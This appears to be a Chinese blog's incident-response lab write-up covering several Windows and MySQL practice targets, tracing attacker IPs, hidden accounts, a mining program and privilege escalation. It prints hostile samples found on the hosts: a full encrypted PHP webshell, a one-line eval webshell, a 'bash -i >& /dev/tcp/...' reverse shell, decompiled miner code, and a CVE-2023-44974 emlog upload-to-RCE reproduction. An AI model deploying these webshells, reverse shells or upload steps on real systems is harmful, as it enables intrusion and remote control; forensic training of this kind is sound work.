<p><strong>连接密码是rebeyond</strong><br>然后前往apache日志根据后门文件名寻找黑客ip<br><img src="https://ooo.0x0.ooo/2024/04/17/OmIa0s.png" alt="OmIa0s.png" loading="lazy">.<br><strong>黑客ip:192.168.126.1</strong><br>先把实时扫描关了，传个工具分析日志<br><img src="https://ooo.0x0.ooo/2024/04/17/OmI57a.png" alt="OmI57a.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/04/17/OmIBHS.png" alt="OmIBHS.png" loading="lazy"><br>发现黑客远程登录记录<br><strong>用户名是hack168$</strong><br>去用户木目录下看果然又这个用户<br><img src="https://ooo.0x0.ooo/2024/04/17/OmIWxC.png" alt="OmIWxC.png" loading="lazy"><br>该黑客目录下桌面有个kuang程序 狂?矿!<br><img src="https://ooo.0x0.ooo/2024/04/17/OmIbJL.png" alt="OmIbJL.png" loading="lazy"><br>点了一下，给我电脑靶机玩炸了，应该是内存拉满了<br><img src="https://ooo.0x0.ooo/2024/04/17/OmIbJL.png" alt="OmIbJL.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/04/17/OmIFZt.png" alt="OmIFZt.png" loading="lazy"><br>不得已重启了一下<br>现在需要找到矿池域名<br>需要py反编译<br>先解包</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">PS E:<span class="token punctuation">\</span>蓝队应急响应工具箱v2024.4<span class="token punctuation">\</span>Tools<span class="token punctuation">\</span>BT-Reverse<span class="token punctuation">\</span>PyinstallRE<span class="token operator">></span> python .<span class="token punctuation">\</span>pyinstxtractor.py .<span class="token punctuation">\</span>Kuang.exe
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Processing .<span class="token punctuation">\</span>Kuang.exe
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Pyinstaller version: <span class="token number">2.1</span>+
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Python version: <span class="token number">3.8</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Length of package: <span class="token number">9606813</span> bytes
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found <span class="token number">85</span> files <span class="token keyword">in</span> CArchive
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Beginning extraction<span class="token punctuation">..</span>.please standby
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Possible entry point: pyiboot01_bootstrap.pyc
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Possible entry point: pyi_rth_inspect.pyc
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Possible entry point: pyi_rth_multiprocessing.pyc
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Possible entry point: pyi_rth_pkgutil.pyc
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Possible entry point: Kuang.pyc
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Warning: This script is running <span class="token keyword">in</span> a different Python version than the one used to build the executable.
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Please run this script <span class="token keyword">in</span> Python <span class="token number">3.8</span> to prevent extraction errors during unmarshalling
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Skipping pyz extraction
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Successfully extracted pyinstaller archive: .<span class="token punctuation">\</span>Kuang.exe

You can now use a python decompiler on the pyc files within the extracted directory</code></pre>
<p>然后反编译pyc<br><img src="https://ooo.0x0.ooo/2024/04/17/OmIhcx.png" alt="OmIhcx.png" loading="lazy"></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># visit https://tool.lu/pyc/ for more information</span>
<span class="token comment"># Version: Python 3.8</span>

<span class="token keyword">import</span> multiprocessing
<span class="token keyword">import</span> requests

<span class="token keyword">def</span> <span class="token function">cpu_intensive_task</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://wakuang.zhigongshanfang.top'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">**</span><span class="token punctuation">(</span><span class="token string">'timeout'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
        <span class="token keyword">continue</span>

    <span class="token keyword">continue</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    cpu_count <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>cpu_count<span class="token punctuation">(</span><span class="token punctuation">)</span>
    processes <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">lambda</span> <span class="token number">.0</span><span class="token punctuation">:</span> <span class="token punctuation">[</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>cpu_intensive_task<span class="token punctuation">,</span> <span class="token operator">**</span><span class="token punctuation">(</span><span class="token string">'target'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token number">.0</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>cpu_count<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> process <span class="token keyword">in</span> processes<span class="token punctuation">:</span>
        process<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> process <span class="token keyword">in</span> processes<span class="token punctuation">:</span>
        process<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><strong>矿池域名<code>wakuang.zhigongshanfang.top</code></strong></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>CVECVE-2023-44974 emlog任意文件上传漏洞<br><img src="https://ooo.0x0.ooo/2024/04/17/OmInMj.png" alt="OmInMj.png" loading="lazy"><br>进入web登录后台 admin&#x2F;123456<br><img src="https://ooo.0x0.ooo/2024/04/17/OmI17p.png" alt="OmI17p.png" loading="lazy"><br>拓展处可以安装插件<br><img src="https://ooo.0x0.ooo/2024/04/17/OmI7LU.png" alt="OmI7LU.png" loading="lazy"><br>上传的压缩包里面要有木马而且需要免杀,用网上exp<br><a href="https://github.com/yangliukk/emlog/tree/main">https://github.com/yangliukk/emlog/tree/main</a><br><img src="https://ooo.0x0.ooo/2024/04/17/OmINXY.png" alt="OmINXY.png" loading="lazy"><br>然后访问<code>/content/plugins/shell/shell.php</code><br><img src="https://ooo.0x0.ooo/2024/04/17/OmIrzv.png" alt="OmIrzv.png" loading="lazy"><br>成功rce</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
	<span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>
<p>shell.php很简单，改成其他远程连接的指令就能拿下windows，比如openssl，nc，powershell等等。</p>
<h1 id="靶场三-windows-2"><a href="#靶场三-windows-2" class="headerlink" title="靶场三 windows(2)"></a>靶场三 windows(2)</h1><p>题目描述</p>
<blockquote>
<p>Administrator<br><a href="mailto:&#90;&#x67;&#x73;&#102;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;">&#90;&#x67;&#x73;&#102;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;</a></p>
</blockquote>
<p>打开靶机用密码<code>Zgsf@qq.com</code>登录<br>先看需要哪些flag<br><img src="https://ooo.0x0.ooo/2024/04/17/OmwGvc.png" alt="OmwGvc.png" loading="lazy"></p>
<blockquote>
<p>1.攻击者的IP地址（两个）？<br>2.攻击者的webshell文件名？<br>3.攻击者的webshell密码？<br>4.攻击者的QQ号？<br>5.攻击者的服务器伪IP地址？<br>6.攻击者的服务器端口？<br>7.攻击者是如何入侵的（选择题）？<br>8.攻击者的隐藏用户名？</p>
</blockquote>
<h2 id="扫后门"><a href="#扫后门" class="headerlink" title="扫后门"></a>扫后门</h2><p>先用d盾扫一下www目录<br><img src="https://ooo.0x0.ooo/2024/04/17/OmwYFD.png" alt="OmwYFD.png" loading="lazy"><br>确实存在后门</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">encode</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$K</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$c</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token variable">$D</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$pass</span><span class="token operator">=</span><span class="token string single-quoted-string">'hack6618'</span><span class="token punctuation">;</span>
<span class="token variable">$payloadName</span><span class="token operator">=</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">;</span>
<span class="token variable">$key</span><span class="token operator">=</span><span class="token string single-quoted-string">'7813d1590d28a7dd'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$pass</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$pass</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$payload</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"getBasicsInfo"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$payload</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
		<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token operator">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">encode</span><span class="token punctuation">(</span>@<span class="token function">run</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token operator">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"getBasicsInfo"</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span></code></pre>
<p><strong>webshell文件名<code>system.php</code></strong><br><strong>webshell密码<code>hack6618</code></strong><br><img src="https://ooo.0x0.ooo/2024/04/17/OmwfRF.png" alt="OmwfRF.png" loading="lazy"><br>看web目录知道这是一个wordpress服务<br>先去日志把黑客ip找出来<br><img src="https://ooo.0x0.ooo/2024/04/17/Omwl96.png" alt="Omwl96.png" loading="lazy"><br>**黑客ip之一<code>192.168.126.135</code>**，并且知道了黑客用户为hack887$<br>看远程连接日志<br><img src="https://ooo.0x0.ooo/2024/04/17/OmwjUP.png" alt="OmwjUP.png" loading="lazy"><br><strong>黑客另一个ip<code>192.168.126.129</code></strong><br>进入黑客的桌面看到两个注册表文件<br><img src="https://ooo.0x0.ooo/2024/04/17/Omw2yb.png" alt="Omw2yb.png" loading="lazy"><br>进入cmd发现找不到这个黑客用户<br><img src="https://ooo.0x0.ooo/2024/04/17/Omw6dl.png" alt="Omw6dl.png" loading="lazy"><br>去注册表找一下<br><img src="https://ooo.0x0.ooo/2024/04/17/OmwXag.png" alt="OmwXag.png" loading="lazy"><br>存在<code>hack887$</code>用户，这是黑客伪装的用户,将其删除<br>在其他文档里寻找黑客信息，果然document里面又腾讯文件,一般里面文件名都是QQ号<br><img src="https://ooo.0x0.ooo/2024/04/17/OmwueB.png" alt="OmwueB.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/04/17/OmwIEs.png" alt="OmwIEs.png" loading="lazy"><br><strong>黑客QQ<code>777888999321</code></strong><br>虽然很长，但毕竟是靶机，就是它了<br>进去继续找信息<br><img src="https://ooo.0x0.ooo/2024/04/17/Omw3IK.png" alt="Omw3IK.png" loading="lazy"><br>在FileRecv里面发现frp工具，一般用来内网穿透<br>在frpc.ini里面保存了攻击者的服务器和端口<br><strong>IP：<code>256.256.66.88</code></strong><br><strong>port:<code>65536</code></strong><br><em>解题</em><br><img src="https://ooo.0x0.ooo/2024/04/17/OpMMRS.png" alt="OpMMRS.png" loading="lazy"></p>
<h1 id="靶场四-windows-3"><a href="#靶场四-windows-3" class="headerlink" title="靶场四 windows(3)"></a>靶场四 windows(3)</h1><p>依旧一个windows web的靶场</p>
<blockquote>
<p>登录账号密码 administrator&#x2F;xj@123456</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/18/OpOIza.png" alt="OpOIza.png" loading="lazy"><br>桌面丰富了一些<br>先看需要哪些flag<br><img src="https://ooo.0x0.ooo/2024/04/18/OpO3JS.png" alt="OpO3JS.png" loading="lazy"></p>
<blockquote>
<p>确保你已获得以下信息：<br>攻击者的两个IP地址<br>攻击者隐藏用户名称<br>三个攻击者留下的flag</p>
</blockquote>
<p>先用d盾查一下webshell<br><img src="https://ooo.0x0.ooo/2024/04/18/OpOClN.png" alt="OpOClN.png" loading="lazy"><br>没有<br>去apache日志看一下<br>access日志只有两个ip<br><img src="https://ooo.0x0.ooo/2024/04/18/OpaMBC.png" alt="OpaMBC.png" loading="lazy"><br><strong>ip1:192.168.75.129</strong><br><strong>ip2:192.168.75.130</strong><br>分析远程连接日志<br><img src="https://ooo.0x0.ooo/2024/04/18/OpaOZL.png" alt="OpaOZL.png" loading="lazy"><br>有个hack6618$用户连结果ip是192.168.75.130<br>那么黑客两个ip应该就是上面两个<br>再查看一下用户<br><img src="https://ooo.0x0.ooo/2024/04/18/Opaaci.png" alt="Opaaci.png" loading="lazy"><br>确定黑客name为<code>hack6618$</code><br>进入到黑客文档看一下<br>在下载里面找到了一个木马文件<br><img src="https://ooo.0x0.ooo/2024/04/18/OpaqMX.png" alt="OpaqMX.png" loading="lazy"><br>还有一个flag<code>flag&#123;888666abc&#125;</code><br>其他地方没东西<br>看一下定时任务<br><img src="https://ooo.0x0.ooo/2024/04/18/Opa57t.png" alt="Opa57t.png" loading="lazy"><br>拿到第二个flag<code>flag&#123;zgsfsys@sec&#125;</code><br>看一下执行了什么操作<br><img src="https://ooo.0x0.ooo/2024/04/18/OpaBLx.png" alt="OpaBLx.png" loading="lazy"><br>就是上面我们在下载里面找到的bat文件<br>然后打开web找找web有什么信息<br><img src="https://ooo.0x0.ooo/2024/04/18/OpaTXj.png" alt="OpaTXj.png" loading="lazy"><br>z-blog的cms<br>网上有工具可以免密登录后台</p>
<blockquote>
<p>下载地址：<a href="https://update.zblogcn.com/tools/nologin.zip">https://update.zblogcn.com/tools/nologin.zip</a></p>
</blockquote>
<p>放到www目录然后打开url<br><img src="https://ooo.0x0.ooo/2024/04/18/OpaWzp.png" alt="OpaWzp.png" loading="lazy"><br>我这编码有点问题不过不影响看<br>有个hacker用户<br>先重置admin用户密码为12345678<br><img src="https://ooo.0x0.ooo/2024/04/18/OpabPU.png" alt="OpabPU.png" loading="lazy"><br>找到hacker用户，在摘要地方找到了第三个flag<br><img src="https://ooo.0x0.ooo/2024/04/18/OpaklY.png" alt="OpaklY.png" loading="lazy"><br>flag3:<code>flag&#123;H@Ck@sec&#125;</code><br>拿下。</p>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
  </entry>
  <entry>
    <title>应急靶场-mysql应急</title>
    <url>/posts/beb16a0d/</url>
    <content><![CDATA[<pre class="language-bash" data-language="bash"><code class="language-bash">mysql应急响应 ssh账号 root  密码 xjmysql
<span class="token function">ssh</span> env.xj.edisec.net  <span class="token parameter variable">-p</span> xxxxx
<span class="token number">1</span>.黑客第一次写入的shell flag<span class="token punctuation">&#123;</span>关键字符串<span class="token punctuation">&#125;</span> 
<span class="token number">2</span>.黑客反弹shell的ip flag<span class="token punctuation">&#123;</span>ip<span class="token punctuation">&#125;</span>
<span class="token number">3</span>.黑客提权文件的完整路径 md5 flag<span class="token punctuation">&#123;</span>md5<span class="token punctuation">&#125;</span> 注 /xxx/xxx/xxx/xxx/xxx.xx
<span class="token number">4</span>.黑客获取的权限 flag<span class="token punctuation">&#123;</span>whoami后的值<span class="token punctuation">&#125;</span></code></pre>
<h2 id="黑客第一次写入的shell"><a href="#黑客第一次写入的shell" class="headerlink" title="黑客第一次写入的shell"></a>黑客第一次写入的shell</h2><p>老规矩 用d盾扫一下 web目录，因为拿下数据库都是从web拿的<br><img src="https://ooo.0x0.ooo/2024/06/13/OJuvnI.png" alt="OJuvnI.png" loading="lazy"><br>看一下<code>sh.pph</code></p>
<pre class="language-php" data-language="php"><code class="language-php">1	2	<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>	4
//ccfda79e-7aa1-4275-bc26-a6189eb9a20b</code></pre>
<p>下面这个貌似flag，提交正确<br><strong>flag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}</strong></p>
<h2 id="黑客反弹shell的ip"><a href="#黑客反弹shell的ip" class="headerlink" title="黑客反弹shell的ip"></a>黑客反弹shell的ip</h2><p>看一下apache日志</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@xuanji:/var/log/apache2<span class="token comment"># cat error.log | grep 'sh.php'</span></code></pre>
<p>是空的，看以下mysql 的日志</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">230731</span> <span class="token number">10</span>:14:49 <span class="token punctuation">[</span>Note<span class="token punctuation">]</span> /usr/sbin/mysqld: ready <span class="token keyword">for</span> connections.
Version: <span class="token string">'5.5.64-MariaDB-1ubuntu0.14.04.1'</span>  socket: <span class="token string">'/var/run/mysqld/mysqld.sock'</span>  port: <span class="token number">3306</span>  <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
sh: <span class="token number">1</span>: curl: not found
--2023-08-01 02:14:11--  http://192.168.100.13:771/
Connecting to <span class="token number">192.168</span>.100.13:771<span class="token punctuation">..</span>. connected.
HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> No headers, assuming HTTP/0.9
Length: unspecified
Saving to: <span class="token string">'index.html'</span>

     0K                                                        <span class="token number">2.46</span> <span class="token operator">=</span><span class="token number">2</span>.0s

<span class="token number">2023</span>-08-01 02:14:13 <span class="token punctuation">(</span><span class="token number">2.46</span> B/s<span class="token punctuation">)</span> - <span class="token string">'index.html'</span> saved <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>

/tmp/1.sh: line <span class="token number">1</span>: --2023-08-01: <span class="token builtin class-name">command</span> not found
/tmp/1.sh: line <span class="token number">2</span>: Connecting: <span class="token builtin class-name">command</span> not found
/tmp/1.sh: line <span class="token number">3</span>: HTTP: <span class="token builtin class-name">command</span> not found
/tmp/1.sh: line <span class="token number">4</span>: Length:: <span class="token builtin class-name">command</span> not found
/tmp/1.sh: line <span class="token number">5</span>: Saving: <span class="token builtin class-name">command</span> not found
/tmp/1.sh: line <span class="token number">7</span>: 0K: <span class="token builtin class-name">command</span> not found
/tmp/1.sh: line <span class="token number">9</span>: syntax error near unexpected token <span class="token variable"><span class="token variable">`</span><span class="token punctuation">(</span>'
/tmp/1.sh: line <span class="token number">9</span>: <span class="token variable">`</span></span><span class="token number">2023</span>-08-01 02:16:35 <span class="token punctuation">(</span><span class="token number">5.01</span> MB/s<span class="token punctuation">)</span> - <span class="token string">'1.sh'</span> saved <span class="token punctuation">[</span><span class="token number">43</span>/43<span class="token punctuation">]</span>'</code></pre>
<p>有个1.sh的文件，打开看到反弹shell的ip</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@xuanji:/var/log/mysql<span class="token comment"># find / -name '1.sh' 2>/dev/null</span>
/tmp/1.sh
/var/lib/mysql/1.sh
root@xuanji:/var/log/mysql<span class="token comment"># cat /tmp/1.sh</span>
<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span>/dev/tcp/192.168.100.13/777 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre>
<p><strong>flag{192.168.100.13}</strong></p>
<h2 id="黑客提权文件的完整路径"><a href="#黑客提权文件的完整路径" class="headerlink" title="黑客提权文件的完整路径"></a>黑客提权文件的完整路径</h2><p>mysql常用udf提权，看一下mysql的插件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">
root@xuanji:/usr/lib/mysql/plugin<span class="token comment"># ls -al</span>
total <span class="token number">4752</span>
drwxr-xr-x. <span class="token number">1</span> mysql mysql      <span class="token number">39</span> Aug  <span class="token number">1</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x. <span class="token number">1</span> root  root       <span class="token number">20</span> Jul <span class="token number">31</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-r--r--. <span class="token number">1</span> mysql mysql   <span class="token number">10416</span> May <span class="token number">16</span>  <span class="token number">2019</span> auth_pam.so
-rw-r--r--. <span class="token number">1</span> mysql mysql    <span class="token number">6464</span> May <span class="token number">16</span>  <span class="token number">2019</span> auth_socket.so
-rw-r--r--. <span class="token number">1</span> mysql mysql   <span class="token number">10200</span> May <span class="token number">16</span>  <span class="token number">2019</span> dialog.so
-rw-r--r--. <span class="token number">1</span> mysql mysql <span class="token number">1600136</span> May <span class="token number">16</span>  <span class="token number">2019</span> ha_innodb.so
-rw-r--r--. <span class="token number">1</span> mysql mysql  <span class="token number">159304</span> May <span class="token number">16</span>  <span class="token number">2019</span> handlersocket.so
-rw-r--r--. <span class="token number">1</span> mysql mysql    <span class="token number">6104</span> May <span class="token number">16</span>  <span class="token number">2019</span> mysql_clear_password.so
-rw-rw-rw-. <span class="token number">1</span> mysql mysql   <span class="token number">10754</span> Aug  <span class="token number">1</span>  <span class="token number">2023</span> mysqludf.so
-rw-r--r--. <span class="token number">1</span> mysql mysql   <span class="token number">39944</span> May <span class="token number">16</span>  <span class="token number">2019</span> semisync_master.so
-rw-r--r--. <span class="token number">1</span> mysql mysql   <span class="token number">14736</span> May <span class="token number">16</span>  <span class="token number">2019</span> semisync_slave.so
-rw-r--r--. <span class="token number">1</span> mysql mysql   <span class="token number">55696</span> May <span class="token number">16</span>  <span class="token number">2019</span> server_audit.so
-rw-r--r--. <span class="token number">1</span> mysql mysql <span class="token number">2918008</span> May <span class="token number">16</span>  <span class="token number">2019</span> sphinx.so
-rw-r--r--. <span class="token number">1</span> mysql mysql   <span class="token number">11008</span> May <span class="token number">16</span>  <span class="token number">2019</span> sql_errlog.so
-rw-rw-rw-. <span class="token number">1</span> mysql mysql      <span class="token number">34</span> Aug  <span class="token number">1</span>  <span class="token number">2023</span> udf.so</code></pre>
<p>果然有udf</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@xuanji:/usr/lib/mysql/plugin<span class="token comment"># cat udf.so</span>
<span class="token number">1</span>       <span class="token number">2</span>       <span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>     <span class="token number">4</span></code></pre>

<p><strong>flag{b1818bde4e310f3d23f1005185b973e7}</strong></p>
<h2 id="黑客获取的权限"><a href="#黑客获取的权限" class="headerlink" title="黑客获取的权限"></a>黑客获取的权限</h2><p>直接拿黑客自定义的udf执行一下whoami看看权限<br>首先得知道mysql密码进入mysql<br>我一顿苦苦看文件在web目录找到了泄露了mysql密码<code>334cc35b3c704593</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@xuanji:/var/www/html<span class="token comment"># cat common.php</span>
<span class="token operator">&lt;</span>?php
<span class="token variable">$conn</span><span class="token operator">=</span>mysqli_connect<span class="token punctuation">(</span><span class="token string">"localhost"</span>,<span class="token string">"root"</span>,<span class="token string">"334cc35b3c704593"</span>,<span class="token string">"cms"</span>,<span class="token string">"3306"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
if<span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token builtin class-name">echo</span> <span class="token string">"数据库连接失败"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@xuanji:/var/www/html<span class="token comment"># mysql -u root -p</span>
Enter password:
Welcome to the MariaDB monitor.  Commands end with <span class="token punctuation">;</span> or <span class="token punctuation">\</span>g.
Your MariaDB connection <span class="token function">id</span> is <span class="token number">6</span>
Server version: <span class="token number">5.5</span>.64-MariaDB-1ubuntu0.14.04.1 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>

Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2000</span>, <span class="token number">2018</span>, Oracle, MariaDB Corporation Ab and others.

Type <span class="token string">'help;'</span> or <span class="token string">'\h'</span> <span class="token keyword">for</span> help. Type <span class="token string">'\c'</span> to <span class="token function">clear</span> the current input statement.

MariaDB <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> * from mysql.func<span class="token punctuation">;</span>
